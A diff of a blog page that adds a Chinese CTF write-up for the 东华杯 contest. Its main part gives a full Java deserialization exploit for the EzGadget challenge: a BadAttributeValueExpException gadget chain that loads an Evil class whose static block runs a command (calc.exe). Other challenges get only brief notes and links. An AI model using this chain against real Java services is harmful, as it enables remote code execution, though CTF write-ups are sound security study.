@@ -18,7 +18,7 @@
   <meta name="author" content="KKfine&#39;s blog">
   <meta name="keywords" content="">
   
-  <title>字节跳动 - KKfine&#39;s blog</title>
+  <title>东华杯 - KKfine&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="字节跳动">
+            <span class="h2" id="subtitle" title="东华杯">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-07 12:21" pubdate>
-        2021年11月7日 中午
+      <time datetime="2021-11-04 13:53" pubdate>
+        2021年11月4日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      0 字
+      485 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      7
        分钟
     </span>
   
@@ -225,10 +225,26 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">字节跳动</h1>
+            <h1 style="display: none">东华杯</h1>
             
             <div class="markdown-body">
-              
+              <h1 id="EzGadget"><a href="#EzGadget" class="headerlink" title="EzGadget"></a>EzGadget</h1><p>这题在我调了几个cc库之后再看就很简单了，可以看另一篇文章。</p>
+<p>找一个重写readobject和tostring得类就行了，这里找到<code>BadAttributeValueExpException</code>类，这个类可以调试几个cc链就明白能用来利用啥了，可参考另一篇文章，这里就是利用了<code>tostringbean</code>的defineclass可以读取任意字节代码，所以就只需要将<code>BadAttributeValueExpException</code>中val值设为ToStringBean类就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();<br>    Class clazz = toStringBean.defineClass((String)<span class="hljs-keyword">null</span>, <span class="hljs-keyword">this</span>.ClassByte, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.ClassByte.length);<br>    Object var3 = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var3 = clazz.newInstance();<br>    &#125; <span class="hljs-keyword">catch</span> (InstantiationException var5) &#123;<br>        var5.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;<br>        var6.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;enjoy it.&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.Tools;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ToStringBean payload = <span class="hljs-keyword">new</span> ToStringBean();<br><br>            File clzFile = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;C:\\Users\\86130\\Desktop\\Evil.class&quot;</span>);<br><br>            <span class="hljs-keyword">byte</span>[] clzBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[(<span class="hljs-keyword">int</span>) clzFile.length()];<br><br>            FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(clzFile);<br>            fis.read(clzBytes); <span class="hljs-comment">//read file into bytes[]</span><br>            fis.close();<br><br>            payload.setClassByte(clzBytes);<br><br>            BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;placeholder&quot;</span>);<br>            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            field.set(badAttributeValueExpException, payload);<br><br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br><br>            ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br><br>            out.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>            out.writeInt(<span class="hljs-number">2021</span>);<br>            <br>            <br>            <br>            <br>            <br>            out.writeObject(badAttributeValueExpException);<br><br>            <span class="hljs-comment">//String data = byteArrayOutputStream.toString();</span><br>            String data = Tools.base64Encode(byteArrayOutputStream.toByteArray());<br><br>            System.out.println(data);<br>            <span class="hljs-keyword">byte</span>[] b = Tools.base64Decode(data);<br>            InputStream inputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(b);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            String name = objectInputStream.readUTF();<br>            <span class="hljs-keyword">int</span> year = objectInputStream.readInt();<br>            <span class="hljs-keyword">if</span> (name.equals(<span class="hljs-string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="hljs-number">2021</span>) &#123;<br>                objectInputStream.readObject();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>Evil.java中写执行的命令就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime r = Runtime.getRuntime();<br>            Process p = r.exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>            p.waitFor();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>第一步登录时注入，</p>
+<p>要求查询结果与输入的用户密码相同，自输出，第五空间考过了一次</p>
+<p>第二步时hcb模板渲染漏洞，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4695">https://xz.aliyun.com/t/4695</a></p>
+<h1 id="apacheproy"><a href="#apacheproy" class="headerlink" title="apacheproy"></a>apacheproy</h1><p>打现有的cve，比赛的时候没发现。weblogic的应用，版本12.2.1.3</p>
+<p>参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7d14e45a96e7">https://www.jianshu.com/p/7d14e45a96e7</a></p>
+<h1 id="OldLibrary"><a href="#OldLibrary" class="headerlink" title="OldLibrary"></a>OldLibrary</h1><p>又是go题</p>
+
             </div>
             <hr>
             <div>
@@ -237,7 +253,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                      <a class="hover-with-bg" href="/categories/WP/">WP</a>
                     
                   </div>
                 
@@ -245,9 +261,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                      <a class="hover-with-bg" href="/tags/TSCTF/">TSCTF</a>
                     
-                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                      <a class="hover-with-bg" href="/tags/WP/">WP</a>
                     
                   </div>
                 
@@ -264,9 +280,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/07/%E9%95%BF%E5%9F%8E%E6%9D%AF/">
+                      <a href="/2021/11/06/2021-10-java%E5%AE%A1%E8%AE%A11/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">长城杯</span>
+                        <span class="hidden-mobile">java审计1</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -274,8 +290,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/11/06/java%E5%81%9A%E9%A2%98(1)/">
-                        <span class="hidden-mobile">java做题1</span>
+                      <a href="/2021/11/01/GKCTF2021/">
+                        <span class="hidden-mobile">node</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
